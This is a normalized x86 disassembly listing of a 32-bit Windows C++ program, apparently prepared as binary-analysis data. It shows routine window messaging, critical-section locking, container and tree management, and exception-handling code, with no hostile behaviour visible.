pop edi
mov [ esi + 0x21c ] eax
pop esi
pop ebx
pop ebp
retn 0x10
jmp [ ecx * 4 + jump_table_412668 ]
mov edx [ esi ]
push 0x0
push eax
mov eax [ edx + 0x11c ]
mov ecx esi
call eax
mov eax 0x1
pop edi
mov [ esi + 0x21c ] eax
pop esi
pop ebx
pop ebp
retn 0x10
mov ecx [ ebp + 0x14 ]
mov edx [ esi ]
mov edx [ edx + 0x11c ]
push ecx
push eax
mov ecx esi
call edx
sub_412680
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0xf060
push esi
mov esi ecx
jne r-xdata
xor eax eax
pop esi
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax + 0xec ]
call edx
mov eax [ esi ]
mov edx [ eax + 0xf4 ]
lea ecx [ ebp + 0x8 ]
push ecx
mov ecx esi
mov [ ebp + 0x8 ] 0x0
call edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0xe8 ]
mov ecx esi
call edx
mov [ esi + 0x21c ] 0x1
pop esi
pop ebp
retn 0x4
sub_4126e0
push esi
push edi
mov edi ecx
mov ecx [ rw-data ]
mov eax [ ecx + 0x50 ]
sub eax [ ecx + 0x4c ]
xor edx edx
sar eax 0x2
test eax eax
jle r-xdata
xor ecx ecx
mov esi [ ecx + 0x4c ]
lea esp [ esp ]
inc edx
add esi 0x4
cmp edx eax
jl r-xdata
cmp [ ecx + 0xc ] 0x5
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
push 0x0
push rw-data
push rw-data
push 0x0
push ecx
call __RTDynamicCast
mov ecx [ edi + 0x1b0 ]
add esp 0x14
pop edi
mov [ eax + 0x60 ] ecx
pop esi
retn
sub_412740
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x244 ]
test eax eax
je r-xdata
mov eax [ edi + 0x2c0 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov esi [ SendMessageW@IAT ]
push eax
mov eax [ edi + 0x1b0 ]
push 0x1
push 0x80
push eax
call esi
mov ecx [ edi + 0x244 ]
mov edx [ edi + 0x1b0 ]
push ecx
push 0x0
push 0x80
push edx
call esi
call [ GetCurrentThreadId@IAT ]
push eax
push rw-data
call sub_412950
lea ecx [ edi + 0x2b4 ]
lea esi [ eax + 0x4 ]
lea ebx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
call sub_41e9f0
mov esi [ ebp - 0x8 ]
add edi 0x2b8
add esi 0x10
lea ebx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
call sub_41e9f0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
mov eax [ edi + 0x1b0 ]
push eax
call [ SetWindowTextW@IAT ]
sub_4127f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ edi + 0x24 ] 0x0
call [ GetCurrentThreadId@IAT ]
push eax
push rw-data
call sub_412950
mov ebx eax
lea eax [ edi + 0x2b4 ]
lea esi [ ebx + 0x4 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
call sub_4128e0
add edi 0x2b8
lea esi [ ebx + 0x10 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
call sub_4128e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412840
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov edx [ ecx - 0x2b4 ]
add ecx 0xfffffd4c
push eax
mov eax [ edx + 0x118 ]
call eax
pop ebp
retn 0x4
pop ebp
retn 0x4
sub_4128e0
mov ecx [ esi + 0x4 ]
push ebx
xor eax eax
push edi
test ecx ecx
jle r-xdata
pop edi
xor eax eax
pop ebx
retn
mov edi [ esi ]
mov ebx [ edx ]
mov edx edi
cmp eax 0xffffffff
je r-xdata
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
test eax eax
js r-xdata
cmp [ edx ] ebx
je r-xdata
cmp eax ecx
jge r-xdata
lea edx [ ecx - 0x1 ]
cmp eax edx
je r-xdata
dec [ esi + 0x4 ]
pop edi
mov eax 0x1
pop ebx
retn
sub ecx eax
add ecx ecx
add ecx ecx
lea edx [ ecx - 0x4 ]
push edx
lea eax [ edi + eax * 4 ]
lea edx [ eax + 0x4 ]
push edx
push ecx
push eax
call sub_402530
add esp 0x10
sub_412950
push ebp
mov ebp esp
push 0xffffffff
push sub_447fba
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ rw-data ]
add esi 0x10
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov ebx 0x1
mov [ ebp - 0x4 ] ebx
push esi
call [ EnterCriticalSection@IAT ]
mov eax [ ebp + 0x8 ]
mov edi [ eax + 0x34 ]
mov ecx [ edi + 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] bl
test ecx ecx
jle r-xdata
xor edi edi
jmp r-xdata
mov edx [ edi ]
jmp r-xdata
push esi
call [ LeaveCriticalSection@IAT ]
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ebx [ ebp + 0xc ]
cmp [ edx ] ebx
je r-xdata
cmp eax 0xffffffff
jne r-xdata
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
test eax eax
js r-xdata
xor edi edi
jmp r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp eax ecx
jge r-xdata
mov ecx [ edi + 0x4 ]
mov edi [ ecx + eax * 4 ]
lea eax [ ecx + eax * 4 ]
sub_412a20
push ebp
mov ebp esp
push 0xffffffff
push sub_446269
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ esi ] r--data
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
lea edi [ esi + 0x14 ]
push 0x18
mov [ ebp - 0x14 ] edi
mov [ edi + 0x8 ] ebx
call [ operator new@IAT ]
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x4 ] bl
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
call _CxxThrowException
mov [ edi + 0x4 ] eax
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov eax 0x1
mov [ ecx + 0x14 ] al
mov edx [ edi + 0x4 ]
mov [ edx + 0x15 ] al
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov [ ebp - 0x4 ] 0x5
mov [ esi + 0x3c ] ebx
mov [ esi + 0x40 ] ebx
mov [ esi + 0x44 ] ebx
mov [ ebp - 0x4 ] 0x6
mov [ esi + 0x24 ] bx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_412b10
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_412b40
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_412b40
push ebp
mov ebp esp
push 0xffffffff
push sub_446d80
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x2
mov eax [ edi + 0x3c ]
xor esi esi
cmp eax esi
je r-xdata
mov [ edi + 0x3c ] esi
mov [ edi + 0x40 ] esi
mov [ edi + 0x44 ] esi
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x28 ]
cmp eax esi
je r-xdata
push eax
call [ operator delete@IAT ]
add esp 0x4
mov [ edi + 0x28 ] esi
mov [ edi + 0x2c ] esi
mov [ edi + 0x30 ] esi
mov [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x14 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x5
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x18 ]
mov eax ebx
call sub_421cd0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebx + 0x4 ]
mov esi [ operator delete@IAT ]
push ebx
call esi
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi + 0x4 ]
xor ebx ebx
cmp eax ebx
je r-xdata
push eax
call [ operator delete@IAT ]
add esp 0x4
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call esi
add esp 0x4
sub_412c20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax + 0x8 ]
sub edi [ eax + 0x4 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov ecx [ eax + 0x8 ]
mov esi [ eax + 0x4 ]
cmp esi ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov esi [ ecx + ebx * 4 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ecx
sub eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
push edi
push ecx
push esi
call [ memmove@IAT ]
mov ecx [ ebp + 0x8 ]
add esp 0xc
add edi esi
mov [ ecx + 0x8 ] edi
inc ebx
cmp ebx edi
jl r-xdata
mov edx [ esi ]
mov eax [ edx + 0x10 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
mov eax [ ebp + 0x8 ]
sub_412ca0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov edx [ esi ]
push eax
mov eax [ edx + 0x4c ]
call eax
test eax eax
jne r-xdata
cmp [ edi + 0xc ] 0x10
mov al 0x1
jne r-xdata
cmp [ edi + 0x68 ] 0x0
je r-xdata
mov [ esi + 0x24 ] al
add esi 0x4
lea ecx [ ebp + 0x8 ]
call sub_428170
mov [ esi + 0x25 ] al
sub_412cf0
push ebp
mov ebp esp
mov edx [ ecx + 0x8 ]
sub edx [ ecx + 0x4 ]
push esi
sar edx 0x2
xor esi esi
push edi
test edx edx
jle r-xdata
xor eax eax
mov ecx [ ecx + 0x4 ]
mov edi [ ebp + 0x8 ]
lea ebx [ ebx ]
inc esi
add ecx 0x4
cmp esi edx
jl r-xdata
cmp [ eax + 0x8 ] edi
je r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_412d30
push ebp
mov ebp esp
mov edx [ ecx + 0x8 ]
sub edx [ ecx + 0x4 ]
push ebx
push esi
sar edx 0x2
xor esi esi
push edi
test edx edx
jle r-xdata
xor eax eax
mov edi [ ecx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
inc esi
add edi 0x4
cmp esi edx
jl r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov ecx [ ecx + 0x14 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp ecx ebx
je r-xdata
sub_412d80
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov edx [ esi + 0x8 ]
push edi
cmp eax edx
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x4
mov edi [ ebp + 0x8 ]
add eax 0x4
cmp eax edx
jne r-xdata
cmp [ ecx + 0x8 ] edi
je r-xdata
mov ecx [ eax ]
test ecx ecx
je r-xdata
lea ecx [ eax + 0x4 ]
sub edx ecx
sar edx 0x2
add edx edx
add edx edx
push edx
push ecx
push eax
call [ memmove@IAT ]
add esp 0xc
add [ esi + 0x8 ] 0xfffffffc
pop edi
mov eax 0x1
pop esi
pop ebp
retn 0x4
sub_412de0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0x4c ]
push ecx
mov ecx edi
call edx
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ edi + 0x8 ]
sub esi [ edi + 0x4 ]
xor ebx ebx
sar esi 0x2
test esi esi
jle r-xdata
lea esp [ esp ]
inc ebx
cmp ebx esi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x58 ]
call eax
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x5c ]
push ecx
mov ecx eax
call edx
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
sub_412e50
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax + 0x8 ]
sub edi [ eax + 0x4 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
xor al al
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov ecx [ eax + 0x4 ]
mov esi [ ecx + ebx * 4 ]
test esi esi
je r-xdata
inc ebx
cmp ebx edi
jl r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x74 ]
mov ecx esi
call eax
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x54 ]
push eax
mov eax [ ebp + 0xc ]
push ecx
push eax
mov ecx esi
call edx
test al al
jne r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_412ec0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x8 ]
sub esi [ ebx + 0x4 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
mov [ ebx + 0x38 ] 0x0
mov ecx [ ebx + 0x2c ]
mov esi [ ebx + 0x28 ]
cmp esi ecx
je r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x18 ]
mov esi [ eax ]
cmp esi eax
je r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
push edi
push ecx
push esi
call [ memmove@IAT ]
add esp 0xc
add edi esi
mov [ ebx + 0x2c ] edi
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x1c ]
call eax
mov ecx [ ebx + 0x18 ]
lea edi [ ebx + 0x14 ]
mov ebx [ ecx + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
mov esi ebx
jne r-xdata
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop edi
pop esi
pop ebx
retn
lea ecx [ ecx ]
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov edx [ esi + 0x8 ]
push edx
mov ecx edi
call sub_413500
mov esi [ esi ]
push ebx
call [ operator delete@IAT ]
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
cmp esi [ ebx + 0x18 ]
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
jmp r-xdata
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
jmp r-xdata
sub_412fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_446d17
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea edi [ esi + 0x14 ]
lea ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
mov ecx edi
call sub_413460
mov esi [ esi + 0x18 ]
mov eax [ ebp - 0x10 ]
cmp eax esi
je r-xdata
push 0x14
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ eax + 0x10 ]
call sub_4267a0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor esi esi
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ ebp - 0x4 ] cl
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ ebp + 0xc ]
push edx
mov ecx esi
call sub_4267a0
lea edx [ ebp + 0x8 ]
mov ebx edi
call sub_4133a0
mov [ eax ] esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4130a0
push ebp
mov ebp esp
sub esp 0x8
cmp [ edi + 0x38 ] 0x0
push ebx
jne r-xdata
lea ecx [ edi + 0x14 ]
lea ebx [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_413460
mov eax [ ebp - 0x8 ]
cmp eax [ edi + 0x18 ]
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ edi + 0x28 ]
mov ecx [ edi + 0x2c ]
sub ecx eax
sar ecx 0x2
xor ebx ebx
test ecx ecx
je r-xdata
mov ecx [ eax + 0x10 ]
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push esi
push eax
mov eax [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push eax
push edx
call sub_426900
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0x28 ]
mov ecx [ edi + 0x2c ]
sub ecx eax
inc ebx
sar ecx 0x2
cmp ebx ecx
jb r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
push esi
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call edx
cmp [ esi ] 0x0
mov [ ebp - 0x4 ] eax
jne r-xdata
sub_413150
push ebx
push esi
mov ebx ecx
mov esi [ ebx + 0x8 ]
sub esi [ ebx + 0x4 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x48 ]
call eax
sub_413180
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
mov esi eax
je r-xdata
mov eax [ esi + 0x3c ]
mov ecx [ esi + 0x40 ]
sub ecx eax
sar ecx 0x2
mov [ ebp + 0x8 ] 0x0
test ecx ecx
je r-xdata
lea edi [ esi + 0x4 ]
lea ecx [ esi + 0x3c ]
mov eax edi
call sub_413270
mov ecx [ edi + 0x4 ]
mov esi [ edi ]
cmp esi ecx
je r-xdata
mov ecx [ esi + 0x40 ]
mov edi [ esi + 0x3c ]
cmp edi ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + edx * 4 ]
mov edi [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x2
xor ecx ecx
mov [ ebp - 0x4 ] ebx
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push esi
call [ memmove@IAT ]
add esp 0xc
add ebx esi
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call [ memmove@IAT ]
add esp 0xc
add ebx edi
mov [ esi + 0x40 ] ebx
mov eax [ esi ]
mov edx [ eax + 0x54 ]
push ebx
mov ecx esi
call edx
mov edx [ edi + ecx * 4 ]
test edx edx
je r-xdata
inc ecx
cmp ecx eax
jb r-xdata
test ebx ebx
je r-xdata
mov ebx [ ebx + 0x8 ]
cmp ebx [ edx + 0x8 ]
je r-xdata
mov eax [ esi + 0x3c ]
mov edx [ esi + 0x40 ]
mov ecx [ ebp + 0x8 ]
sub edx eax
inc ecx
sar edx 0x2
mov [ ebp + 0x8 ] ecx
cmp ecx edx
jb r-xdata
mov ebx [ ebp - 0x4 ]
sub_413270
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov esi ecx
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
mov eax [ ebx ]
mov edx ecx
sub edx eax
sar edx 0x2
push edi
mov edi [ esi ]
mov [ ebp - 0x4 ] edx
test edx edx
jne r-xdata
mov edx [ esi + 0x4 ]
sub edx edi
sar edx 0x2
cmp [ ebp - 0x4 ] edx
ja r-xdata
mov ecx [ esi + 0x4 ]
cmp edi ecx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
cmp [ ebp - 0x4 ] ecx
ja r-xdata
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push edi
call [ memmove@IAT ]
mov eax [ ebx + 0x4 ]
sub eax [ ebx ]
mov ecx [ esi ]
add esp 0xc
sar eax 0x2
lea edx [ ecx + eax * 4 ]
pop edi
mov [ esi + 0x4 ] edx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call [ memmove@IAT ]
add esp 0xc
add ebx edi
pop edi
mov [ esi + 0x4 ] ebx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
test eax eax
je r-xdata
lea edi [ eax + edx * 4 ]
mov edx edi
sub edx eax
sar edx 0x2
add edx edx
add edx edx
push edx
push eax
mov eax [ esi ]
push eax
call [ memmove@IAT ]
mov eax [ ebx + 0x4 ]
mov ecx [ esi + 0x4 ]
sub eax edi
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push edi
push ecx
call [ memmove@IAT ]
add esp 0x18
add eax ebx
mov [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x4 ]
sub edi [ ebx ]
sar edi 0x2
call sub_4134c0
test al al
je r-xdata
push eax
call [ operator delete@IAT ]
add esp 0x4
mov eax [ esi ]
mov ecx [ ebx ]
push eax
mov eax [ ebx + 0x4 ]
call sub_413980
mov [ esi + 0x4 ] eax
sub_4133a0
push ebp
mov ebp esp
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
sub esp 0x8
cmp [ eax + 0x15 ] 0x0
push esi
mov esi ecx
jne r-xdata
cmp esi [ ebx + 0x4 ]
je r-xdata
mov ecx [ edx ]
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
push edi
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov [ ebp - 0x4 ] 0x0
call sub_443060
push esi
lea edi [ ebp - 0x4 ]
mov ecx ebx
call sub_4139b0
mov eax [ ebp - 0x4 ]
pop edi
add eax 0x10
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edx ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov esi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ esi + 0x10 ]
pop esi
mov esp ebp
pop ebp
retn
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_413410
mov eax [ edi + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
push esi
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
pop esi
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_413500
mov esi [ esi ]
push ebx
call [ operator delete@IAT ]
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_413460
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp edx ecx
je r-xdata
push edi
mov edi [ ebx ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebx ]
cmp esi [ edx + 0xc ]
jb r-xdata
mov edx ecx
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
cmp [ ecx + 0xc ] edi
jae r-xdata
pop edi
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_4134c0
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x3fffffff
jbe r-xdata
xor al al
retn
mov ecx edi
call sub_4138d0
mov [ esi ] eax
mov [ esi + 0x4 ] eax
lea eax [ eax + edi * 4 ]
mov [ esi + 0x8 ] eax
mov al 0x1
retn
push r--data
call [ std::_Xlength_error@IAT ]
sub_413500
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_413500
mov esi [ esi ]
push edi
call [ operator delete@IAT ]
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov edi esi
je r-xdata
sub_413540
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ecx ]
sub eax esi
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
inc eax
sar edx 0x2
cmp eax edx
jbe r-xdata
push r--data
call [ std::_Xlength_error@IAT ]
pop esi
retn
push edi
mov esi edx
shr esi 0x1
mov edi 0x3fffffff
sub edi esi
cmp edi edx
pop edi
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_413590
mov edx eax
cmp edx eax
jae r-xdata
sub_413590
push ebp
mov ebp esp
push 0xffffffff
push sub_445280
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
